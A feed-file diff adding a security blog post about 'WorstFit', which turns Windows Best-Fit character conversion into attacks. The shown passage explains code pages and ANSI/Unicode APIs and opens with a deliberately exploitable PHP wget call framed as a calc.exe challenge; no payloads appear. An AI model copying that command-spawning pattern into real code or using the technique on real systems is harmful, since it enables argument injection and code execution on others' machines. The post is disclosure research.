@@ -4,13 +4,817 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="https://devco.re/" rel="self"/>
  <link href="https://devco.re"/>
- <updated>2025-01-02T01:14:58+08:00</updated>
+ <updated>2025-01-09T20:16:03+08:00</updated>
  <id>https://devco.re</id>
  <author>
    <name></name>
    <email></email>
  </author>
 
+ 
+ <entry>
+   <title>WorstFit: Unveiling Hidden Transformers in Windows ANSI!</title>
+   <link href="https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/"/>
+   <updated>2025-01-09T00:00:00+08:00</updated>
+   <id>https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi</id>
+   <content type="html">&lt;style&gt;
+    .language-plaintext {
+        background-color: rgba(0, 0, 0, 0.04);
+        padding: 0.2em;
+        font-size: 85%;
+    }
+
+    .highlight {
+        border-left: 2px solid #44D62C !important;
+    }
+&lt;/style&gt;
+
+&lt;p&gt;&lt;em&gt;Author: &lt;a href=&quot;https://x.com/orange_8361&quot;&gt;Orange&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://x.com/_splitline_&quot;&gt;Splitline&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;The research unveils a new attack surface in Windows by exploiting &lt;strong&gt;Best-Fit&lt;/strong&gt;, an internal charset conversion feature. Through our work, we successfully transformed this feature into several practical attacks, including Path Traversal, Argument Injection, and even RCE, affecting numerous well-known applications!&lt;/p&gt;
+
+&lt;p&gt;Given that the root cause spans compiler behavior, C/C++ runtime and developer’s mistakes, we also discussed the challenges of pushing fixes within the open-source ecosystem.&lt;/p&gt;
+
+&lt;p&gt;Get the latest update and slides on our website!🔥 → &lt;a href=&quot;https://worst.fit/&quot;&gt;https://worst.fit/&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Let’s imagine that: you’re a pentester, and your target website is running the following code. Can you pop a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calc.exe&lt;/code&gt; with that? &lt;!-- You can have a quick try on your own. --&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://example.tld/&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;path&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wget.exe -q &quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can have a quick try on your own. The PHP code uses a secure way to spawn the command. Looks a bit hard, right?&lt;/p&gt;
+
+&lt;p&gt;Well, today, we would like to present a new technique to break through it!&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;outline&quot;&gt;Outline&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;ul&gt;
+    &lt;li&gt;&lt;a href=&quot;#outline&quot;&gt;Outline&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;#decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/a&gt;
+      &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;#the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/a&gt;&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;#it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;#it-was-the-worst-of-fit--the-novel-attack-surface-on-windows&quot;&gt;It was the Worst of Fit – The novel attack surface on Windows&lt;/a&gt;
+      &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;#-the-nightmare-of-east-asia---cve-2024-4577&quot;&gt;🔥 The nightmare of East-Asia - CVE-2024-4577&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#-filename-smuggling&quot;&gt;🔥 Filename Smuggling&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#-argument-splitting&quot;&gt;🔥 Argument Splitting&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#-environment-variable-confusion&quot;&gt;🔥 Environment Variable Confusion&lt;/a&gt;&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;#the-duskor-dawnof-the-worstfit&quot;&gt;The Dusk–or Dawn–of the WorstFit&lt;/a&gt;&lt;/li&gt;
+    &lt;li&gt;&lt;a href=&quot;#epilogue&quot;&gt;Epilogue&lt;/a&gt;
+      &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;#mitigations&quot;&gt;Mitigations&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/li&gt;
+  &lt;/ul&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;decoding-the-windows-encodings&quot;&gt;Decoding the Windows Encodings&lt;/h2&gt;
+
+&lt;p&gt;If you are a Windows user, you’re probably aware that the Windows operating system supports Unicode. This means we can seamlessly put emojis ✅, áccènted letters, 𝒻𝒶𝓃𝒸𝓎 𝕤𝕪𝕞𝕓𝕠𝕝𝕤 and CJK &lt;abbr title=&quot;CHARACTERS&quot;&gt;匚卄八尺八匚ㄒヨ尺丂&lt;/abbr&gt; pretty much anywhere — like file names, file contents, or even environment variables. But have you ever wondered how Windows manages to handle those non-ASCII characters?&lt;/p&gt;
+
+&lt;p&gt;Well, to describe this, let’s dive into the history of encoding in Windows first to understand how it handles.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;the-early-days-ansi-and-code-pages&quot;&gt;The Early Days: ANSI and Code Pages&lt;/h3&gt;
+
+&lt;p&gt;Windows initially used ANSI encoding, which relied on code pages such as the one shown below. It used 8 to 16 bits to represent a single character. While these mappings were effective for certain languages, they were unable to accommodate mixed or universal character sets.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;&lt;strong&gt;Code Page&lt;/strong&gt;&lt;/th&gt;
+      &lt;th&gt;&lt;strong&gt;Language&lt;/strong&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1250&lt;/td&gt;
+      &lt;td&gt;Central / Eastern European languages (e.g., Polish, Czech)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1251&lt;/td&gt;
+      &lt;td&gt;Cyrillic-based languages (e.g., Russian, Bulgarian)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1252&lt;/td&gt;
+      &lt;td&gt;Western European languages (e.g., English, German, French)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1253&lt;/td&gt;
+      &lt;td&gt;Greek&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1254&lt;/td&gt;
+      &lt;td&gt;Turkish&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1255&lt;/td&gt;
+      &lt;td&gt;Hebrew&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1256&lt;/td&gt;
+      &lt;td&gt;Arabic&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1257&lt;/td&gt;
+      &lt;td&gt;Baltic languages (e.g., Estonian, Latvian, Lithuanian)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;1258&lt;/td&gt;
+      &lt;td&gt;Vietnamese&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;932&lt;/td&gt;
+      &lt;td&gt;Japanese&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;936&lt;/td&gt;
+      &lt;td&gt;Simplified Chinese&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;949&lt;/td&gt;
+      &lt;td&gt;Korean&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;950&lt;/td&gt;
+      &lt;td&gt;Traditional Chinese&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;874&lt;/td&gt;
+      &lt;td&gt;Thai&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;For instance, back in the day, as a Taiwanese, if my Japanese friend sent me an article written on their Windows computer, I’d probably end up with a scrambled mess of &lt;a href=&quot;https://en.wikipedia.org/wiki/Mojibake&quot;&gt;mojibake&lt;/a&gt; because my code page 950 system couldn’t properly interpret the Japanese 932 code page.&lt;/p&gt;
+
+&lt;p&gt;To handle different encoding needs, Windows doesn’t rely on just one type of code page — there are actually two:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;ACP&lt;/strong&gt; (ANSI Code Page): Used for most applications and system settings, such as file operations or managing environment variables. Our research here primarily focuses on this type of code page, as it significantly impacts the scenarios we’ll examine.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;OEMCP&lt;/strong&gt; (Original Equipment Manufacturer Code Page): Mainly used for device communication, such as reading or writing to the console.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To check which ACP (ANSI code page) you’re using, consider these methods:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Using PowerShell&lt;/strong&gt;
+    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;powershell.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;OutputEncoding.WindowsCodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;From the Registry&lt;/strong&gt;
+    &lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ACP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Additionally, you might also heard of &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/chcp&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt;&lt;/a&gt;. However, be aware that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chcp&lt;/code&gt; displays the &lt;strong&gt;OEMCP&lt;/strong&gt;  rather than the ACP, which is the focus of our research here.&lt;/p&gt;
+
+&lt;h3 id=&quot;the-unicode-era-utf-16&quot;&gt;The Unicode Era: UTF-16&lt;/h3&gt;
+&lt;p&gt;To address the limitations of code pages, Windows transitioned to Unicode in the mid-1990s. Unlike code pages, Unicode could represent characters from nearly all languages in a single standard.&lt;/p&gt;
+
+&lt;p&gt;Initially, Windows used UCS-2 for Unicode but soon upgraded to &lt;strong&gt;UTF-16&lt;/strong&gt;, which uses 16 bits for most characters and expands to 32 bits for rarer ones (e.g., emojis, ancient scripts). Windows also switched to &lt;strong&gt;wide characters&lt;/strong&gt; for core APIs like file systems, system information, and text processing.&lt;/p&gt;
+
+&lt;p&gt;Now you might be wondering: Hey, what about the most popular Unicode encoding nowadays: &lt;strong&gt;UTF-8&lt;/strong&gt;? Well, it’s already there, but still in a sort of beta phase. For most languages, the UTF-8 feature sadly isn’t enabled by default.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;the-dual-era-of-encoding&quot;&gt;The Dual Era of Encoding&lt;/h3&gt;
+
+&lt;p&gt;Even though Unicode became the backbone of Windows, Windows still need to do what they always do: backward compatible. They still need to support the old ANSI code pages. To achieve this, Windows implemented two different versions of APIs:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;ANSI APIs&lt;/strong&gt;: A Windows code page version with the letter “A” postfix used to indicate “ANSI”. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablea&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Unicode APIs&lt;/strong&gt;: A Unicode version with the letter “W” postfix used to indicate “wide (character)”. For example, &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getenvironmentvariablew&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW&lt;/code&gt;&lt;/a&gt; function.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This approach allows developers to easily obtain their desired data format by simply switching between the A-postfix and W-postfix APIs.&lt;/p&gt;
+
+&lt;p&gt;It sounds perfect – But wait, so how can a wide character UTF-16 string also be in the ANSI format? Aren’t they fundamentally different?&lt;/p&gt;
+
+&lt;p&gt;To illustrate this, let’s explore an example. Imagine we’re on an English (&lt;strong&gt;Windows-1252&lt;/strong&gt; code page) system with an environment variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ENV=Hello&lt;/code&gt; stored in the system. The data is internally stored as &lt;strong&gt;UTF-16&lt;/strong&gt; (wide character format), but we can retrieve it using both Unicode and ANSI APIs:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4800 6500 6C00 6C00 6F00&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; — &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;48 65 6C 6C 6F&lt;/code&gt; in ANSI).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For the &lt;strong&gt;Unicode API&lt;/strong&gt;, there’s no problem—Unicode in, Unicode out, with no conversion needed. For the &lt;strong&gt;ANSI API&lt;/strong&gt;, Windows applies an implicit conversion by calling &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-rtlunicodestringtoansistring&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt;&lt;/a&gt; (or sometimes &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/stringapiset/nf-stringapiset-widechartomultibyte&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WideCharToMultiByte&lt;/code&gt;&lt;/a&gt;) to convert the original Unicode string to an ANSI string. Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;Hello&quot;&lt;/code&gt; consists only of ASCII characters, everything works perfectly and as expected.&lt;/p&gt;
+
+&lt;p&gt;But what happens if the environment variable contains a more complex string, like &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√π⁷≤∞&lt;/code&gt;&lt;/strong&gt;, with a lot of non-ASCII characters?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Unicode API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableW(L&quot;ENV&quot;)&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;L&quot;√π⁷≤∞&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1a22 c003 7720 6422 1e22&lt;/code&gt; in UTF-16LE).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The &lt;strong&gt;Unicode API&lt;/strong&gt; correctly returns the original string as we expected.&lt;/p&gt;
+
+&lt;p&gt;Now, what happens with the ANSI API? Are you able to guess the result?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;ANSI API&lt;/strong&gt;: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetEnvironmentVariableA(&quot;ENV&quot;)&lt;/code&gt; — &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RtlUnicodeStringToAnsiString&lt;/code&gt; ⭢ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt; (Hex: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;76 70 37 3D 38&lt;/code&gt; in ANSI) 🤯&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Yep, the output is &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vp7=8&lt;/code&gt;&lt;/strong&gt;. A strange result, right? I guess you can’t even figure out the connection between the original characters and their character codes!&lt;/p&gt;
+
+&lt;p&gt;This bizarre transformation is what’s known as &lt;strong&gt;“Best-Fit”&lt;/strong&gt; behavior. As a result, the original string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;√π⁷≤∞&lt;/code&gt; transforms into a nonsensical &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;vp7=8&quot;&lt;/code&gt;. This behavior highlights the pitfalls of relying on ANSI APIs when handling non-ASCII characters.&lt;/p&gt;
+
+&lt;p&gt;And actually, it’s not just when using Windows APIs directly — this behaciour also occurs when using non-wide-character version CRT (C runtime) functions like &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/getenv-wgetenv&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getenv&lt;/code&gt;&lt;/a&gt;. Surprisingly, even when you receive arguments or environment variables through a seemingly straightforward non-wide-character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; function like:&lt;/p&gt;
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test_env&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;argv[%d] = %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The same Best-Fit behavior applies to both the arguments and the environment variables. Here’s what happens when we run this code:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250109/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This happens because, during compilation, the compiler inserts several functions and links the CRT DLLs for you, which internally rely on ANSI Windows APIs. As a result, the same Best-Fit behavior is triggered implicitly.&lt;/p&gt;
+
+&lt;p&gt;We keep talking about Best-Fit, but how does this quirky behavior actually work in the end?&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;it-was-the-best-of-fit&quot;&gt;It was the Best of Fit&lt;/h2&gt;
+
+&lt;p&gt;In Windows, “Best-Fit” character conversion is a way the operating system handles situations where it needs to convert characters from UTF-16 to ANSI, but the exact character doesn’t exist in the target code page.&lt;/p&gt;
+
+&lt;p&gt;For instance, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;∞&lt;/code&gt; (&lt;a href=&quot;https://www.compart.com/en/unicode/U+221E&quot;&gt;U+221E&lt;/a&gt;) symbol isn’t part of the &lt;a href=&quot;https://en.wikipedia.org/wiki/Windows-1252#Codepage_layout&quot;&gt;Windows-1252 code page&lt;/a&gt;, so Microsoft decided to map it to the “&lt;strong&gt;closest&lt;/strong&gt;” character—&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8&lt;/code&gt; (&lt;a href=&quot;https://worst.fit/mapping/#CP%3A1252%20FROM%3A0x221e&quot;&gt;🔍&lt;/a&gt;). Uh, okay. Yeah I guess they kinda look similar, but I thought they should be still completely different things…&lt;/p&gt;
+
+&lt;p&gt;Anyway, obviously there’s no strict formula for Best-Fit mapping – what Microsoft do is more about making characters look, or even “feel” somewhat alike.&lt;/p&gt;
+
+&lt;p&gt;Also, different language configurations (code pages) handle mappings differently. For instance, the yen sign (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;U+00A5&lt;/code&gt;) is mapped to a backslash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;) on the Japanese (932) code page, to a “Y” on the Central European (1250) code page, and remains unchanged on most other code pages. This variability will play a significant role in how exploits behave across different system settings.&lt;/p&gt;
+
+&lt;p&gt;If you’re curious about the specifics, you can check out our &lt;a href=&quot;https://worst.fit/mapping/&quot;&gt;Best-fit Mapping Grepper&lt;/a&gt; tool or dive into the raw mapping data on &lt;a href=&quot;https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt&quot;&gt;Unicode.org&lt;/a&gt; by yourself.&lt;/p&gt;
+
+&lt;p&gt;Interestingly, during our research we found that this &lt;strong&gt;Best-Fit&lt;/strong&gt; behavior was already mentioned back in Black Hat USA 2009 during Chris Weber’s presentation, &lt;a href=&quot;https://www.blackhat.com/presentations/bh-usa-09/WEBER/BHUSA09-Weber-UnicodeSecurityPreview-SLIDES.pdf&quot;&gt;“Unicode Security”&lt;/a&gt;. However, he only briefly touched on how this feature could be exploited to bypass simple blacklist.&lt;/p&gt;
+
+&lt;p&gt;But this time, we’re taking big steps forward – showing how those sneaky Best-Fit conversions can operate on a &lt;strong&gt;system-wide level&lt;/strong&gt;, leading to even more impactful exploits, all unfolding right under your nose.&lt;/p&gt;
+
+&lt;p&gt;Now, it’s time to turn this quirky behaviour into something more impactful: &lt;strong&gt;real WorstFit vulnerabilities&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
